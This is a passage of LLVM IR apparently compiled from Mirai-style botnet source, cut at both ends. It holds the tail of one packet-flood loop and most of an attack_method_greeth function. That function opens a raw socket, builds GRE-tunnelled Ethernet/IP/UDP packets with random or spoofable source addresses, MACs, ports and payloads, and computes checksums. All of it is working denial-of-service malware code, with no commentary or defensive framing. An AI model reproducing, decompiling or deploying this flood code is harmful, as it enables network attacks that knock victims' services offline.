  %405 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %404, i32 0, i32 0
  %406 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %405, i32 0, i32 2
  %407 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %406, i32 0, i32 0
  store i32 %400, i32* %407, align 4
  %408 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %409 = load i32, i32* %9, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %408, i64 %410
  %412 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %411, i32 0, i32 0
  %413 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %412, i32 0, i32 1
  store i16 0, i16* %413, align 2
  %414 = load i32, i32* %10, align 4
  %415 = load i8*, i8** %26, align 8
  %416 = load i32, i32* %18, align 4
  %417 = sext i32 %416 to i64
  %418 = add i64 52, %417
  %419 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %420 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %421 = load i32, i32* %9, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %420, i64 %422
  %424 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %423, i32 0, i32 0
  %425 = bitcast %struct.sockaddr_in* %424 to %struct.sockaddr*
  store %struct.sockaddr* %425, %struct.sockaddr** %419, align 8
  %426 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %427 = load %struct.sockaddr*, %struct.sockaddr** %426, align 8
  %428 = call i64 @sendto(i32 noundef %414, i8* noundef %415, i64 noundef %418, i32 noundef 16384, %struct.sockaddr* %427, i32 noundef 16)
  br label %429

429:                                              ; preds = %362
  %430 = load i32, i32* %9, align 4
  %431 = add nsw i32 %430, 1
  store i32 %431, i32* %9, align 4
  br label %243, !llvm.loop !14

432:                                              ; preds = %243
  br label %242

433:                                              ; preds = %84, %78
  ret void
}

; Function Attrs: nounwind
declare i32 @socket(i32 noundef, i32 noundef, i32 noundef) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32 noundef) #1

declare i32 @close(i32 noundef) #4

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 noundef zeroext) #2

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32 noundef) #2

declare i64 @sendto(i32 noundef, i8* noundef, i64 noundef, i32 noundef, %struct.sockaddr*, i32 noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_greeth(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i8, i8* %5, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 noundef %42, i64 noundef 8) #7
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %11, align 8
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 noundef zeroext %45, %struct.attack_option* noundef %46, i8 noundef zeroext 2, i32 noundef 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %12, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 noundef zeroext %49, %struct.attack_option* noundef %50, i8 noundef zeroext 3, i32 noundef 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %13, align 2
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 noundef zeroext %53, %struct.attack_option* noundef %54, i8 noundef zeroext 4, i32 noundef 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %14, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 noundef zeroext %57, %struct.attack_option* noundef %58, i8 noundef zeroext 5, i32 noundef 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %15, align 1
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 noundef zeroext %61, %struct.attack_option* noundef %62, i8 noundef zeroext 6, i32 noundef 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %16, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 noundef zeroext %65, %struct.attack_option* noundef %66, i8 noundef zeroext 7, i32 noundef 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %17, align 2
  %69 = load i8, i8* %7, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = call i32 @attack_get_opt_int(i8 noundef zeroext %69, %struct.attack_option* noundef %70, i8 noundef zeroext 0, i32 noundef 512)
  store i32 %71, i32* %18, align 4
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 noundef zeroext %72, %struct.attack_option* noundef %73, i8 noundef zeroext 1, i32 noundef 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %19, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 noundef zeroext %76, %struct.attack_option* noundef %77, i8 noundef zeroext 19, i32 noundef 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %20, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 noundef zeroext %80, %struct.attack_option* noundef %81, i8 noundef zeroext 25, i32 noundef %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #7
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

86:                                               ; preds = %4
  br label %472

87:                                               ; preds = %4
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 noundef %88, i32 noundef 0, i32 noundef 3, i8* noundef %89, i32 noundef 4) #7
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

92:                                               ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 noundef %93)
  br label %472

95:                                               ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

96:                                               ; preds = %252, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %255

101:                                              ; preds = %96
  %102 = call noalias i8* @calloc(i64 noundef 1510, i64 noundef 8) #7
  %103 = load i8**, i8*** %11, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %22, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.grehdr*
  store %struct.grehdr* %115, %struct.grehdr** %23, align 8
  %116 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %117 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %116, i64 1
  %118 = bitcast %struct.grehdr* %117 to %struct.ethhdr*
  store %struct.ethhdr* %118, %struct.ethhdr** %24, align 8
  %119 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %120 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %119, i64 1
  %121 = bitcast %struct.ethhdr* %120 to %struct.iphdr*
  store %struct.iphdr* %121, %struct.iphdr** %25, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i64 1
  %124 = bitcast %struct.iphdr* %123 to %struct.udphdr*
  store %struct.udphdr* %124, %struct.udphdr** %26, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %126 = bitcast %struct.iphdr* %125 to i8*
  %127 = load i8, i8* %126, align 4
  %128 = and i8 %127, 15
  %129 = or i8 %128, 64
  store i8 %129, i8* %126, align 4
  %130 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %131 = bitcast %struct.iphdr* %130 to i8*
  %132 = load i8, i8* %131, align 4
  %133 = and i8 %132, -16
  %134 = or i8 %133, 5
  store i8 %134, i8* %131, align 4
  %135 = load i8, i8* %12, align 1
  %136 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 1
  store i8 %135, i8* %137, align 1
  %138 = load i32, i32* %18, align 4
  %139 = sext i32 %138 to i64
  %140 = add i64 66, %139
  %141 = trunc i64 %140 to i16
  %142 = call zeroext i16 @htons(i16 noundef zeroext %141) #8
  %143 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %144 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %143, i32 0, i32 2
  store i16 %142, i16* %144, align 2
  %145 = load i16, i16* %13, align 2
  %146 = call zeroext i16 @htons(i16 noundef zeroext %145) #8
  %147 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 3
  store i16 %146, i16* %148, align 4
  %149 = load i8, i8* %14, align 1
  %150 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 5
  store i8 %149, i8* %151, align 4
  %152 = load i8, i8* %15, align 1
  %153 = icmp ne i8 %152, 0
  br i1 %153, label %154, label %158

154:                                              ; preds = %101
  %155 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %156 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 4
  store i16 %155, i16* %157, align 2
  br label %158

158:                                              ; preds = %154, %101
  %159 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 6
  store i8 47, i8* %160, align 1
  %161 = load i32, i32* %21, align 4
  %162 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 8
  store i32 %161, i32* %163, align 4
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 1
  %169 = load i32, i32* %168, align 4
  %170 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 9
  store i32 %169, i32* %171, align 4
  %172 = call zeroext i16 @htons(i16 noundef zeroext 25944) #8
  %173 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %174 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %173, i32 0, i32 1
  store i16 %172, i16* %174, align 2
  %175 = call zeroext i16 @htons(i16 noundef zeroext 2048) #8
  %176 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %177 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %176, i32 0, i32 2
  store i16 %175, i16* %177, align 1
  %178 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %179 = bitcast %struct.iphdr* %178 to i8*
  %180 = load i8, i8* %179, align 4
  %181 = and i8 %180, 15
  %182 = or i8 %181, 64
  store i8 %182, i8* %179, align 4
  %183 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %184 = bitcast %struct.iphdr* %183 to i8*
  %185 = load i8, i8* %184, align 4
  %186 = and i8 %185, -16
  %187 = or i8 %186, 5
  store i8 %187, i8* %184, align 4
  %188 = load i8, i8* %12, align 1
  %189 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 1
  store i8 %188, i8* %190, align 1
  %191 = load i32, i32* %18, align 4
  %192 = sext i32 %191 to i64
  %193 = add i64 28, %192
  %194 = trunc i64 %193 to i16
  %195 = call zeroext i16 @htons(i16 noundef zeroext %194) #8
  %196 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 2
  store i16 %195, i16* %197, align 2
  %198 = load i16, i16* %13, align 2
  %199 = zext i16 %198 to i32
  %200 = xor i32 %199, -1
  %201 = trunc i32 %200 to i16
  %202 = call zeroext i16 @htons(i16 noundef zeroext %201) #8
  %203 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 3
  store i16 %202, i16* %204, align 4
  %205 = load i8, i8* %14, align 1
  %206 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 5
  store i8 %205, i8* %207, align 4
  %208 = load i8, i8* %15, align 1
  %209 = icmp ne i8 %208, 0
  br i1 %209, label %210, label %214

210:                                              ; preds = %158
  %211 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %212 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 4
  store i16 %211, i16* %213, align 2
  br label %214

214:                                              ; preds = %210, %158
  %215 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 6
  store i8 17, i8* %216, align 1
  %217 = call i32 @rand_next()
  %218 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 8
  store i32 %217, i32* %219, align 4
  %220 = load i8, i8* %20, align 1
  %221 = icmp ne i8 %220, 0
  br i1 %221, label %222, label %228

222:                                              ; preds = %214
  %223 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 9
  %225 = load i32, i32* %224, align 4
  %226 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 9
  store i32 %225, i32* %227, align 4
  br label %236

228:                                              ; preds = %214
  %229 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %230 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %229, i32 0, i32 8
  %231 = load i32, i32* %230, align 4
  %232 = sub i32 %231, 1024
  %233 = xor i32 %232, -1
  %234 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 9
  store i32 %233, i32* %235, align 4
  br label %236

236:                                              ; preds = %228, %222
  %237 = load i16, i16* %16, align 2
  %238 = call zeroext i16 @htons(i16 noundef zeroext %237) #8
  %239 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %240 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %239, i32 0, i32 0
  store i16 %238, i16* %240, align 2
  %241 = load i16, i16* %17, align 2
  %242 = call zeroext i16 @htons(i16 noundef zeroext %241) #8
  %243 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %244 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %243, i32 0, i32 1
  store i16 %242, i16* %244, align 2
  %245 = load i32, i32* %18, align 4
  %246 = sext i32 %245 to i64
  %247 = add i64 8, %246
  %248 = trunc i64 %247 to i16
  %249 = call zeroext i16 @htons(i16 noundef zeroext %248) #8
  %250 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %251 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %250, i32 0, i32 2
  store i16 %249, i16* %251, align 2
  br label %252

252:                                              ; preds = %236
  %253 = load i32, i32* %9, align 4
  %254 = add nsw i32 %253, 1
  store i32 %254, i32* %9, align 4
  br label %96, !llvm.loop !15

255:                                              ; preds = %96
  br label %256

256:                                              ; preds = %471, %255
  store i32 0, i32* %9, align 4
  br label %257

257:                                              ; preds = %468, %256
  %258 = load i32, i32* %9, align 4
  %259 = load i8, i8* %5, align 1
  %260 = zext i8 %259 to i32
  %261 = icmp slt i32 %258, %260
  br i1 %261, label %262, label %471

262:                                              ; preds = %257
  %263 = load i8**, i8*** %11, align 8
  %264 = load i32, i32* %9, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds i8*, i8** %263, i64 %265
  %267 = load i8*, i8** %266, align 8
  store i8* %267, i8** %30, align 8
  %268 = load i8*, i8** %30, align 8
  %269 = bitcast i8* %268 to %struct.iphdr*
  store %struct.iphdr* %269, %struct.iphdr** %31, align 8
  %270 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i64 1
  %272 = bitcast %struct.iphdr* %271 to %struct.grehdr*
  store %struct.grehdr* %272, %struct.grehdr** %32, align 8
  %273 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %274 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %273, i64 1
  %275 = bitcast %struct.grehdr* %274 to %struct.ethhdr*
  store %struct.ethhdr* %275, %struct.ethhdr** %33, align 8
  %276 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %277 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %276, i64 1
  %278 = bitcast %struct.ethhdr* %277 to %struct.iphdr*
  store %struct.iphdr* %278, %struct.iphdr** %34, align 8
  %279 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i64 1
  %281 = bitcast %struct.iphdr* %280 to %struct.udphdr*
  store %struct.udphdr* %281, %struct.udphdr** %35, align 8
  %282 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %283 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %282, i64 1
  %284 = bitcast %struct.udphdr* %283 to i8*
  store i8* %284, i8** %36, align 8
  %285 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i32 0, i32 2
  %290 = load i8, i8* %289, align 4
  %291 = zext i8 %290 to i32
  %292 = icmp slt i32 %291, 32
  br i1 %292, label %293, label %314

293:                                              ; preds = %262
  %294 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %295 = load i32, i32* %9, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %294, i64 %296
  %298 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %297, i32 0, i32 1
  %299 = load i32, i32* %298, align 4
  %300 = call i32 @ntohl(i32 noundef %299) #8
  %301 = call i32 @rand_next()
  %302 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %303 = load i32, i32* %9, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %305, i32 0, i32 2
  %307 = load i8, i8* %306, align 4
  %308 = zext i8 %307 to i32
  %309 = lshr i32 %301, %308
  %310 = add i32 %300, %309
  %311 = call i32 @htonl(i32 noundef %310) #8
  %312 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %313 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %312, i32 0, i32 9
  store i32 %311, i32* %313, align 4
  br label %314

314:                                              ; preds = %293, %262
  %315 = load i32, i32* %21, align 4
  %316 = icmp eq i32 %315, -1
  br i1 %316, label %317, label %321

317:                                              ; preds = %314
  %318 = call i32 @rand_next()
  %319 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i32 0, i32 8
  store i32 %318, i32* %320, align 4
  br label %321

321:                                              ; preds = %317, %314
  %322 = load i16, i16* %13, align 2
  %323 = zext i16 %322 to i32
  %324 = icmp eq i32 %323, 65535
  br i1 %324, label %325, label %340

325:                                              ; preds = %321
  %326 = call i32 @rand_next()
  %327 = and i32 %326, 65535
  %328 = trunc i32 %327 to i16
  %329 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %330 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %329, i32 0, i32 3
  store i16 %328, i16* %330, align 4
  %331 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %332 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %331, i32 0, i32 3
  %333 = load i16, i16* %332, align 4
  %334 = zext i16 %333 to i32
  %335 = sub nsw i32 %334, 1000
  %336 = xor i32 %335, -1
  %337 = trunc i32 %336 to i16
  %338 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %339 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %338, i32 0, i32 3
  store i16 %337, i16* %339, align 4
  br label %340

340:                                              ; preds = %325, %321
  %341 = load i16, i16* %16, align 2
  %342 = zext i16 %341 to i32
  %343 = icmp eq i32 %342, 65535
  br i1 %343, label %344, label %350

344:                                              ; preds = %340
  %345 = call i32 @rand_next()
  %346 = and i32 %345, 65535
  %347 = trunc i32 %346 to i16
  %348 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %349 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %348, i32 0, i32 0
  store i16 %347, i16* %349, align 2
  br label %350

350:                                              ; preds = %344, %340
  %351 = load i16, i16* %17, align 2
  %352 = zext i16 %351 to i32
  %353 = icmp eq i32 %352, 65535
  br i1 %353, label %354, label %360

354:                                              ; preds = %350
  %355 = call i32 @rand_next()
  %356 = and i32 %355, 65535
  %357 = trunc i32 %356 to i16
  %358 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %359 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %358, i32 0, i32 1
  store i16 %357, i16* %359, align 2
  br label %360

360:                                              ; preds = %354, %350
  %361 = load i8, i8* %20, align 1
  %362 = icmp ne i8 %361, 0
  br i1 %362, label %367, label %363

363:                                              ; preds = %360
  %364 = call i32 @rand_next()
  %365 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %366 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %365, i32 0, i32 9
  store i32 %364, i32* %366, align 4
  br label %373

367:                                              ; preds = %360
  %368 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %369 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %368, i32 0, i32 9
  %370 = load i32, i32* %369, align 4
  %371 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %372 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %371, i32 0, i32 9
  store i32 %370, i32* %372, align 4
  br label %373

373:                                              ; preds = %367, %363
  %374 = call i32 @rand_next()
  store i32 %374, i32* %37, align 4
  %375 = call i32 @rand_next()
  store i32 %375, i32* %38, align 4
  %376 = call i32 @rand_next()
  store i32 %376, i32* %39, align 4
  %377 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %378 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %377, i32 0, i32 0
  %379 = getelementptr inbounds [6 x i8], [6 x i8]* %378, i64 0, i64 0
  %380 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* noundef %379, i8* noundef %380, i32 noundef 4)
  %381 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %382 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %381, i32 0, i32 1
  %383 = getelementptr inbounds [6 x i8], [6 x i8]* %382, i64 0, i64 0
  %384 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* noundef %383, i8* noundef %384, i32 noundef 4)
  %385 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %386 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %385, i32 0, i32 0
  %387 = getelementptr inbounds [6 x i8], [6 x i8]* %386, i64 0, i64 0
  %388 = getelementptr inbounds i8, i8* %387, i64 4
  %389 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* noundef %388, i8* noundef %389, i32 noundef 2)
  %390 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %391 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %390, i32 0, i32 1
  %392 = getelementptr inbounds [6 x i8], [6 x i8]* %391, i64 0, i64 0
  %393 = getelementptr inbounds i8, i8* %392, i64 4
  %394 = bitcast i32* %39 to i8*
  %395 = getelementptr inbounds i8, i8* %394, i64 2
  call void @util_memcpy(i8* noundef %393, i8* noundef %395, i32 noundef 2)
  %396 = load i8, i8* %19, align 1
  %397 = icmp ne i8 %396, 0
  br i1 %397, label %398, label %401

398:                                              ; preds = %373
  %399 = load i8*, i8** %36, align 8
  %400 = load i32, i32* %18, align 4
  call void @rand_str(i8* noundef %399, i32 noundef %400)
  br label %401

401:                                              ; preds = %398, %373
  %402 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %403 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %402, i32 0, i32 7
  store i16 0, i16* %403, align 2
  %404 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %405 = bitcast %struct.iphdr* %404 to i16*
  %406 = call zeroext i16 @checksum_generic(i16* noundef %405, i32 noundef 20)
  %407 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 7
  store i16 %406, i16* %408, align 2
  %409 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 0, i16* %410, align 2
  %411 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %412 = bitcast %struct.iphdr* %411 to i16*
  %413 = call zeroext i16 @checksum_generic(i16* noundef %412, i32 noundef 20)
  %414 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 %413, i16* %415, align 2
  %416 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %417 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %416, i32 0, i32 3
  store i16 0, i16* %417, align 2
  %418 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %419 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %420 = bitcast %struct.udphdr* %419 to i8*
  %421 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %422 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %421, i32 0, i32 2
  %423 = load i16, i16* %422, align 2
  %424 = load i32, i32* %18, align 4
  %425 = sext i32 %424 to i64
  %426 = add i64 8, %425
  %427 = trunc i64 %426 to i32
  %428 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %418, i8* noundef %420, i16 noundef zeroext %423, i32 noundef %427)
  %429 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %430 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %429, i32 0, i32 3
